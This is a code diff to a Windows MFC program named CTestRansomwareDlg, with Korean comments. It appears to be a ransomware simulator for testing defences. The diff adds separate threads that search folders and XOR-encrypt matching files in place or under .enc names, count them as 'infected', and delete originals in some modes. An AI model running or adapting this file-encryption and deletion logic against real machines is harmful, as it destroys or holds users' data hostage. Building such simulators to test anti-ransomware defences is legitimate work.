@@ -21,8 +21,12 @@ SYSTEMTIME g_time; // 시간 구조체.
 MMRESULT g_idMNTimer1; // 타이머 핸들러
 void CALLBACK OnTimerFunc(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2);
 
-CWinThread*	pThreadFileFiles = NULL;
-static volatile bool g_isFileFiles;
+CWinThread*	pThreadSearchFiles = NULL;
+CWinThread*	pThreadEncryptFiles = NULL;
+static volatile bool g_isSearchFiles;
+static volatile bool g_isEncryptFiles;
+
+void WaitG(double dwMillisecond);
 
 // CTestRansomwareDlg 대화 상자
 
@@ -52,6 +56,7 @@ BEGIN_MESSAGE_MAP(CTestRansomwareDlg, CDialogEx)
 	ON_NOTIFY(LVN_GETDISPINFO, IDC_LIST1, &CTestRansomwareDlg::OnLvnGetdispinfoList1)
 	ON_WM_TIMER()
 	ON_BN_CLICKED(IDC_BUTTON3, &CTestRansomwareDlg::OnBnClickedButton3)
+	ON_WM_DESTROY()
 END_MESSAGE_MAP()
 
 
@@ -103,7 +108,14 @@ BOOL CTestRansomwareDlg::OnInitDialog()
 
 	m_cryptKey = 0x32;
 	m_cryptType = 0;
+	m_cryptInterval = 0;
 	m_bBypassDecoy = false;
+
+	m_isEncryptReady = false;
+
+	// CRITICAL SECTION - Initial
+	InitializeCriticalSection(&m_csFileLog);
+	InitializeCriticalSection(&m_csFileQueue);
 
 	SetTimer(1, 1000, 0); // 패킷 카운트 타이머
 	ctr_staticStatus.SetWindowTextA("Ready");
@@ -203,11 +215,22 @@ void CALLBACK OnTimerFunc(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWOR
 
 	//if (wTimerID == 1) {
 	if (pDlg->m_isRunningFindFiles) {
-		EnterCriticalSection(&pDlg->m_cs);
 		pDlg->UpdateLogList();
-		LeaveCriticalSection(&pDlg->m_cs);
 	}
 	//}
+}
+
+
+void CTestRansomwareDlg::OnDestroy()
+{
+	CDialogEx::OnDestroy();
+
+	// TODO: 여기에 메시지 처리기 코드를 추가합니다.
+
+	// CRITICAL SECTION - Delete
+	DeleteCriticalSection(&m_csFileLog);
+	DeleteCriticalSection(&m_csFileQueue);
+
 }
 
 
@@ -227,19 +250,21 @@ void CTestRansomwareDlg::AddLogList(CString msg, bool wTime)
 	tmpFileLog.strPath.SetString(msg);
 	
 	if(m_isRunningFindFiles)
-		EnterCriticalSection(&m_cs);
+		EnterCriticalSection(&m_csFileLog);
 
 	m_listFileLog.push_back(tmpFileLog);
 
 	if (m_isRunningFindFiles)
-		LeaveCriticalSection(&m_cs);
+		LeaveCriticalSection(&m_csFileLog);
 }
+
 
 void CTestRansomwareDlg::UpdateLogList()
 {
 	int listNum;
 	CString strMsg;
 
+	EnterCriticalSection(&m_csFileLog);
 	ctr_listLog.SetItemCountEx(m_listFileLog.size(), LVSICF_NOINVALIDATEALL | LVSICF_NOSCROLL);
 
 	listNum = m_listFileLog.size() - 1;
@@ -247,8 +272,60 @@ void CTestRansomwareDlg::UpdateLogList()
 
 	strMsg.Format("Infected: %d / Total: %d", m_numInfected, m_numTotal);
 	ctr_staticStatus2.SetWindowTextA(strMsg);
+	LeaveCriticalSection(&m_csFileLog);
 }
 
+
+// 파일 암호화 스레드
+static UINT EncryptTargetFiles(LPVOID lpParam)
+{
+	CTestRansomwareDlg* pDlg = (CTestRansomwareDlg*)lpParam;
+
+	bool result;
+	CString strPath;
+	queue<CString> *queueTarget = (queue<CString>*)&pDlg->m_queueTargetFiles;
+	
+	while (1) {
+		result = false;
+
+		EnterCriticalSection(&pDlg->m_csFileQueue);
+		if (!queueTarget->empty()) {
+			strPath = queueTarget->front();
+			queueTarget->pop();
+			result = true;
+		}
+		else {
+			if (!pDlg->m_isRunningFindFiles) {
+				LeaveCriticalSection(&pDlg->m_csFileQueue);
+				break;
+			}
+		}
+		LeaveCriticalSection(&pDlg->m_csFileQueue);
+
+		if(result == true){
+			// 암호화 수행
+			if (pDlg->EncryptFileRs(strPath) == true)
+				pDlg->m_numInfected++;
+			pDlg->m_isEncryptReady = false;
+			pDlg->UpdateLogList();
+		}
+
+		// 대기
+		if (pDlg->m_cryptInterval > 0 && pDlg->m_isEncryptReady == false){
+			WaitG(pDlg->m_cryptInterval);
+			pDlg->m_isEncryptReady = true;
+		}
+		else{
+			Sleep(1);
+		}
+	}
+
+	pThreadEncryptFiles = NULL;
+	return 0;
+}
+
+
+// 파일 검색 스레드
 static UINT SearchTargetFiles(LPVOID lpParam)
 {
 	FIND_FILE_INFO *param = (FIND_FILE_INFO*)lpParam;
@@ -265,18 +342,27 @@ static UINT SearchTargetFiles(LPVOID lpParam)
 	strTemp.Format("========== 검색 시작 ==========");
 	pDlg->AddLogList(strTemp);
 
-	InitializeCriticalSection(&pDlg->m_cs);
-
 	pDlg->m_isRunningFindFiles = true;
+
+	pThreadEncryptFiles = AfxBeginThread(EncryptTargetFiles, (LPVOID)pDlg, THREAD_PRIORITY_NORMAL, 0, 0);
+	if (pThreadEncryptFiles == NULL) {
+		AfxMessageBox("[Error] Fail to create 'EncryptTargetFiles' thread.", true);
+		return 0;
+	}
+
 	pDlg->FindFiles(param->strPath);
 	pDlg->m_isRunningFindFiles = false;
-	DeleteCriticalSection(&pDlg->m_cs);
+
+	pDlg->ctr_staticStatus.SetWindowTextA("Encrypting file...");
+
+	if(pThreadEncryptFiles != NULL)
+		WaitForSingleObject(pThreadEncryptFiles->m_hThread, INFINITE);
 
 	pDlg->CreateListFile();
 	pDlg->UpdateLogList();
 	pDlg->ctr_staticStatus.SetWindowTextA("Complete");
 
-	pThreadFileFiles = NULL;
+	pThreadSearchFiles = NULL;
 	return 0;
 }
 
@@ -310,9 +396,9 @@ void CTestRansomwareDlg::OnBnClickedButton1()
 	param->strPath = strPath;
 	param->param = this;
 
-	pThreadFileFiles = AfxBeginThread(SearchTargetFiles, (LPVOID)param, THREAD_PRIORITY_NORMAL, 0, 0);
-	if (pThreadFileFiles == NULL) {
-		AddLogList("[Error] Fail to create moving thread.", true);
+	pThreadSearchFiles = AfxBeginThread(SearchTargetFiles, (LPVOID)param, THREAD_PRIORITY_NORMAL, 0, 0);
+	if (pThreadSearchFiles == NULL) {
+		AfxMessageBox("[Error] Fail to create 'SearchTargetFiles' thread.", true);
 		return;
 	}
 }
@@ -411,8 +497,10 @@ bool CTestRansomwareDlg::FindFiles(LPCTSTR szFilePath)
 				if (strstr(szSrcFile, (LPSTR)(LPCTSTR)m_strFilter)) {
 					strTemp = szSrcFile;
 					if(CheckFileExtension(strTemp) == true){
-						if(EncryptFileRs(szSrcFile) == true)
-							m_numInfected++;
+						// 감염 대상 파일 큐에 추가
+						EnterCriticalSection(&m_csFileQueue);
+						m_queueTargetFiles.push(szSrcFile);
+						LeaveCriticalSection(&m_csFileQueue);
 					}
 				}
 			}
@@ -476,6 +564,8 @@ bool CTestRansomwareDlg::AddCheckFileExtension(CString StrExt)
 	return true;
 }
 
+
+// 감염된 파일 리스트 추가
 bool CTestRansomwareDlg::AddInfectedFile(CString StrPath)
 {
 	bool result;
@@ -550,13 +640,13 @@ bool CTestRansomwareDlg::EncryptFileRs(CString strPath)
 	source = fopen((LPSTR)(LPCTSTR)strPath, "rb+");
 	if (source == NULL)
 		return false;
-	if(m_cryptType > 0)
+	if(m_cryptType > 1)
 		dest = fopen((LPSTR)(LPCTSTR)strPath2, "wb");
 
 	while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
 		for (int i = 0; i < size; i++)
 			buf[i] = buf[i] ^ (unsigned char)m_cryptKey; // XOR
-		if (m_cryptType == 0) {
+		if (m_cryptType == 0 || m_cryptType == 1) {
 			bEof = feof(source);
 			fseek(source, (-1)*size, SEEK_CUR);
 			fwrite(buf, 1, size, source);
@@ -568,22 +658,25 @@ bool CTestRansomwareDlg::EncryptFileRs(CString strPath)
 	}
 
 	fclose(source);
-	if (m_cryptType > 0)
+	if (m_cryptType > 1)
 		fclose(dest);
 	
-	if (m_cryptType == 0){
+	if (m_cryptType == 1) {
 		MoveFileEx(strPath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
 	}
-	else if (m_cryptType == 1) {
+	else if (m_cryptType == 2) {
 		DeleteFile(strPath); // 원본 파일 삭제
 	}
-	else if (m_cryptType == 2) {
+	else if (m_cryptType == 3) {
 		// 원본 덮어쓰기
 		DeleteFile(strPath); // 원본 파일 삭제
 	}
 
 	// 감염 파일 목록 추가
-	AddInfectedFile(strPath2);
+	if (m_cryptType == 0)
+		AddInfectedFile(strPath);
+	else
+		AddInfectedFile(strPath2);
 
 	return true;
 }
@@ -623,10 +716,13 @@ bool CTestRansomwareDlg::DecryptFileRs()
 				break; // EOF
 		}
 		fclose(source);
-		strPath2 = szFilePath;
-		strPath2.Replace(".enc", "");
-		MoveFileEx(szFilePath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
-		strTemp.Format("복구 완료: %s", strPath2);
+		if (m_cryptType > 0) {
+			strPath2 = szFilePath;
+			strPath2.Replace(".enc", "");
+			DeleteFile(strPath2); // 원본 파일 삭제
+			MoveFileEx(szFilePath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
+		}
+		strTemp.Format("복구 완료: %s", strPath);
 		AddLogList(strTemp);
 	}
 
